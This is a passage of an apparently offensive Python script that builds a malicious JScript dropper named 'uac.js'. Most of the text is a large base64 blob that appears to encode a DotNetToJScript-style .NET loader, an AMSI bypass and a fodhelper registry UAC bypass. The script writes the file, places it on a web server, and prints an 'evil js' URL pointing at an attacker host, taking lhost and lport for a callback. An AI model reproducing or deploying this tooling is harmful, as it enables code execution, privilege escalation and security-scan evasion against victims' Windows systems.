UdNQVJnQTEiKwoiQUhZQVdBQnVBR1FBWlFCYUFGWUFOUUI1QUdNQU1RQTFBRzhBV0FCdEFGWUFaUUJpQUVjQWR3QjFBRm9BV0FCb0FHd0FTUUJIQUd3QSIrCiJiQUJsQUVNQVp3QnZBR0lBYlFCV0FETUFUQUJYQURrQWFRQmhBRzBBVmdCcUFHUUFRd0JDQUhVQVdnQllBRkVBZFFCa0FESUFWZ0JwIisKIkFGa0FNZ0I0QUhBQVdnQlhBRFVBTUFCTEFGTUFOUUJyQUdJQU13QmtBSFVBWWdCSEFEa0FhQUJhQUVnQVRnQXdBR01BYlFCc0FIVUEiKwoiV2dCNUFHZ0FZZ0JWQURNQWJBQjZBR1FBUndCV0FIUUFUQUJzQUZJQWJBQmxBRWdBVVFCMUFGSUFWd0ExQUdvQVlnQXlBRklBY0FCaSIrCiJBRzBBWkFCa0FFOEFhZ0J3QUVJQVZRQXdBRTRBU2dCVEFGTUFOUUJJQUZvQVdBQlNBRlFBWkFCSUFFb0FjQUJpQUcwQVl3QnZBRmNBIisKIk1nQk9BRzhBV1FCWUFFb0FZZ0JZQUZZQU1RQkJBRXNBUkFCRkFIY0FUZ0JEQUVFQWN3QkpBRVFBUlFCNEFFNEFhUUJCQUhNQVRRQlUiKwoiQUVVQU1nQkpBRU1BZHdCNEFFMEFWQUJKQUdjQVRBQkVBRlVBTkFCTUFFUUFVUUF6QUVrQVF3QjNBR2NBVGdCRUFHTUFjd0JKQUVRQSIrCiJVUUExQUVrQVF3QjNBREVBVGdCNUFIY0Fad0JPQUZRQVFRQnpBRWtBUkFCUkFESUFUQUJFQUZFQU5RQk1BRU1BUVFBeEFFNEFRd0JCIisKIkFITUFTUUJFQUZVQU1nQk1BRVFBVVFBeUFFa0FRd0IzQURBQVR3QlRBRUVBY3dCT0FGUUFSUUJ6QUU0QVZBQk5BR2NBVEFCRUFGRUEiKwoiTWdCTUFFTUFRUUF4QUU0QVV3QkJBSE1BVGdCRUFHTUFjd0JOQUZRQVJRQXdBRXdBUkFCRkFIZ0FUZ0I1QUhjQVp3Qk5BRlFBUlFCMyIrCiJBRXdBUXdCQkFEQUFUZ0JwQUhjQVp3Qk5BRlFBUlFBeUFFa0FRd0IzQUdjQVRRQlVBRWtBZHdCSkFFTUFkd0I0QUUwQVZBQlpBSEFBIisKIlN3QlRBR3NBY0FCSkFHY0FQUUE5QUFBalV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVF3QnNBR0VBY3dCekFHVUFjd0JjQUFBOWJRQnoiKwoiQUMwQWN3QmxBSFFBZEFCcEFHNEFad0J6QUZ3QVV3Qm9BR1VBYkFCc0FGd0FUd0J3QUdVQWJnQmNBR01BYndCdEFHMEFZUUJ1QUdRQSIrCiJBVjlUQUc4QVpnQjBBSGNBWVFCeUFHVUFYQUJEQUd3QVlRQnpBSE1BWlFCekFGd0FiUUJ6QUMwQWN3QmxBSFFBZEFCcEFHNEFad0J6IisKIkFGd0FVd0JvQUdVQWJBQnNBRndBVHdCd0FHVUFiZ0JjQUdNQWJ3QnRBRzBBWVFCdUFHUUFBUjlFQUdVQWJBQmxBR2NBWVFCMEFHVUEiKwoiUlFCNEFHVUFZd0IxQUhRQVpRQUFBUUJEUXdBNkFGd0Fkd0JwQUc0QVpBQnZBSGNBY3dCY0FITUFlUUJ6QUhRQVpRQnRBRE1BTWdCYyIrCiJBR1lBYndCa0FHZ0FaUUJzQUhBQVpRQnlBQzRBWlFCNEFHVUFBQmR0QUhNQUxRQnpBR1VBZEFCMEFHa0FiZ0JuQUhNQUFZWEwza3V4IisKIk80UkVvcm1wZy9yZ3dGTUFCQ0FCQVFnRElBQUJCU0FCQVJFUkJDQUJBUTRFSUFFQkFnb0hCZzRZQ1IwRkhRVU9Cd0FDQVJKUkVWVUkiKwoiQUFRQkhRVUlHQWdGQUFFZEJRNEVBQUFTWVFVZ0FRNGRCUU1HRW1rR0lBSVNhUTRDQlNBQkVta09CU0FDQVE0Y0JDQUFFbkVGSUFFQiIrCiJFWFVESUFBQ0JBQUJBUWdGQUFFU2JRNEl0M3BjVmhrMDRJa0RCaEVRQndBRUNCZ09EZ2dFQUFFWURnVUFBaGdZRGdnQUJBSVlDUWtRIisKIkNRZ0JBQWdBQUFBQUFCNEJBQUVBVkFJV1YzSmhjRTV2YmtWNFkyVndkR2x2YmxSb2NtOTNjd0VJQVFBQ0FBQUFBQUFVQVFBUFJYaGgiKwoiYlhCc1pVRnpjMlZ0WW14NUFBQXBBUUFrUlhoaGJYQnNaU0JCYzNObGJXSnNlU0JtYjNJZ1JHOTBUbVYwVkc5S1UyTnlhWEIwQUFBRiIrCiJBUUFBQUFBa0FRQWZRMjl3ZVhKcFoyaDBJTUtwSUVwaGJXVnpJRVp2Y25Ob1lYY2dNakF4TndBQUtRRUFKRFUyTlRrNFpqRmpMVFprIisKIk9EZ3RORGs1TkMxaE16a3lMV0ZtTXpNM1lXSmxOVGMzTndBQURBRUFCekV1TUM0d0xqQUFBQVVCQUFFQUFBUUJBQUFBQUFBQUFBQUEiKwoiTUVYMllBQUFBQUFDQUFBQUhBRUFBRUF3QUFCQUVnQUFVbE5FVXdGRnVJY3NrU3hNaWwxWEpybi96UFVCQUFBQVhGd3hPVEl1TVRZNCIrCiJMakV6TlM0M1hIWnBjM1ZoYkhOMGRXUnBiMXhFYjNST1pYUlViMHBUWTNKcGNIUmNSWGhoYlhCc1pVRnpjMlZ0WW14NVhHOWlhbHg0IisKIk5qUmNVbVZzWldGelpWeEZlR0Z0Y0d4bFFYTnpaVzFpYkhrdWNHUmlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJJTWNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFRQUFBQUdBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUIiKwoiQUFBQU1BQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBU0FBQUFGaEFBQUN3QXdBQUFBQUFBQUFBQUFDd0F6UUFBQUJXQUZNQSIrCiJYd0JXQUVVQVVnQlRBRWtBVHdCT0FGOEFTUUJPQUVZQVR3QUFBQUFBdlFUdi9nQUFBUUFBQUFFQUFBQUFBQUFBQVFBQUFBQUFQd0FBIisKIkFBQUFBQUFFQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUVRQUFBQUJBRllBWVFCeUFFWUFhUUJzQUdVQVNRQnVBR1lBYndBQUFBQUEiKwoiSkFBRUFBQUFWQUJ5QUdFQWJnQnpBR3dBWVFCMEFHa0Fid0J1QUFBQUFBQUFBTEFFRUFNQUFBRUFVd0IwQUhJQWFRQnVBR2NBUmdCcCIrCiJBR3dBWlFCSkFHNEFaZ0J2QUFBQTdBSUFBQUVBTUFBd0FEQUFNQUF3QURRQVlnQXdBQUFBWWdBbEFBRUFRd0J2QUcwQWJRQmxBRzRBIisKImRBQnpBQUFBUlFCNEFHRUFiUUJ3QUd3QVpRQWdBRUVBY3dCekFHVUFiUUJpQUd3QWVRQWdBR1lBYndCeUFDQUFSQUJ2QUhRQVRnQmwiKwoiQUhRQVZBQnZBRW9BVXdCakFISUFhUUJ3QUhRQUFBQUFBQ0lBQVFBQkFFTUFid0J0QUhBQVlRQnVBSGtBVGdCaEFHMEFaUUFBQUFBQSIrCiJBQUFBQUVnQUVBQUJBRVlBYVFCc0FHVUFSQUJsQUhNQVl3QnlBR2tBY0FCMEFHa0Fid0J1QUFBQUFBQkZBSGdBWVFCdEFIQUFiQUJsIisKIkFFRUFjd0J6QUdVQWJRQmlBR3dBZVFBQUFEQUFDQUFCQUVZQWFRQnNBR1VBVmdCbEFISUFjd0JwQUc4QWJnQUFBQUFBTVFBdUFEQUEiKwoiTGdBd0FDNEFNQUFBQUVnQUZBQUJBRWtBYmdCMEFHVUFjZ0J1QUdFQWJBQk9BR0VBYlFCbEFBQUFSUUI0QUdFQWJRQndBR3dBWlFCQiIrCiJBSE1BY3dCbEFHMEFZZ0JzQUhrQUxnQmtBR3dBYkFBQUFHSUFId0FCQUV3QVpRQm5BR0VBYkFCREFHOEFjQUI1QUhJQWFRQm5BR2dBIisKImRBQUFBRU1BYndCd0FIa0FjZ0JwQUdjQWFBQjBBQ0FBcVFBZ0FFb0FZUUJ0QUdVQWN3QWdBRVlBYndCeUFITUFhQUJoQUhjQUlBQXkiKwoiQURBQU1RQTNBQUFBQUFBcUFBRUFBUUJNQUdVQVp3QmhBR3dBVkFCeUFHRUFaQUJsQUcwQVlRQnlBR3NBY3dBQUFBQUFBQUFBQUZBQSIrCiJGQUFCQUU4QWNnQnBBR2NBYVFCdUFHRUFiQUJHQUdrQWJBQmxBRzRBWVFCdEFHVUFBQUJGQUhnQVlRQnRBSEFBYkFCbEFFRUFjd0J6IisKIkFHVUFiUUJpQUd3QWVRQXVBR1FBYkFCc0FBQUFRQUFRQUFFQVVBQnlBRzhBWkFCMUFHTUFkQUJPQUdFQWJRQmxBQUFBQUFCRkFIZ0EiKwoiWVFCdEFIQUFiQUJsQUVFQWN3QnpBR1VBYlFCaUFHd0FlUUFBQURRQUNBQUJBRkFBY2dCdkFHUUFkUUJqQUhRQVZnQmxBSElBY3dCcCIrCiJBRzhBYmdBQUFERUFMZ0F3QUM0QU1BQXVBREFBQUFBNEFBZ0FBUUJCQUhNQWN3QmxBRzBBWWdCc0FIa0FJQUJXQUdVQWNnQnpBR2tBIisKImJ3QnVBQUFBTVFBdUFEQUFMZ0F3QUM0QU1BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUVOQUFBQUJBQUFBQWtYQUFBQUNRWUFBQUFKRmdBQUFBWWFBQUFBSjFONWMzUmxiUzVTWldac1pXTjAiKwoiYVc5dUxrRnpjMlZ0WW14NUlFeHZZV1FvUW5sMFpWdGRLUWdBQUFBS0N3QUEiOwp2YXIgZW50cnlfY2xhc3MgPSAnVGVzdENsYXNzJzsKCnRyeSB7CiAgICBzZXR2ZXJzaW9uKCk7CiAgICB2YXIgc3RtID0gYmFzZTY0VG9TdHJlYW0oc2VyaWFsaXplZF9vYmopOwogICAgdmFyIGZtdCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdTeXN0ZW0uUnVudGltZS5TZXJpYWxpemF0aW9uLkZvcm1hdHRlcnMuQmluYXJ5LkJpbmFyeUZvcm1hdHRlcicpOwogICAgdmFyIGFsID0gbmV3IEFjdGl2ZVhPYmplY3QoJ1N5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QnKTsKICAgIHZhciBuID0gZm10LlN1cnJvZ2F0ZVNlbGVjdG9yOwogICAgdmFyIGQgPSBmbXQuRGVzZXJpYWxpemVfMihzdG0pOwogICAgYWwuQWRkKG4pOwogICAgdmFyIG8gPSBkLkR5bmFtaWNJbnZva2UoYWwuVG9BcnJheSgpKS5DcmVhdGVJbnN0YW5jZShlbnRyeV9jbGFzcyk7"
        lower = "by5nb2dvKHNjKTsKfSBjYXRjaCAoZSkgewogICAgZGVidWcoZS5tZXNzYWdlKTsKfQ=="

        runfilename = "uac.js"

        fodfilename,cmdstring_b64 = writefodhelper(lhost,"exe")
        data = "\n\tvar sc = \"%s\"" % cmdstring_b64

    with open(runfilename,'w') as f:
        amsi = base64.b64decode(amsi).decode() 
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(amsi + "\n\n") #will fail the first time, disable if not necessary (but now works!)
        f.write(upper)
        f.write(data + ";\n")
        f.write("\t"+lower)
    
    f.close()
    print ('[+] %s written' % runfilename)
    return runfilename
    pass

def makejs(bitness,pformat,uacbypass,lhost):
    if uacbypass == "0":
        gen(lhost,lport,bitness,pformat)
    if uacbypass == "1":
        runner(lhost,lport,bitness)
    runfilename = writejs(bitness,pformat,uacbypass,lhost)
    payfilepath = "/var/www/html/"
    copy(runfilename,payfilepath,runfilename)
    print ('[+] evil js: http://'+lhost+'/'+runfilename+'')
    return runfilename

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port

    uacbypass = args.uacbypass
    if uacbypass != "1":
        uacbypass = "0"

    pformat = "raw"

    makejs(bitness,pformat,uacbypass,lhost)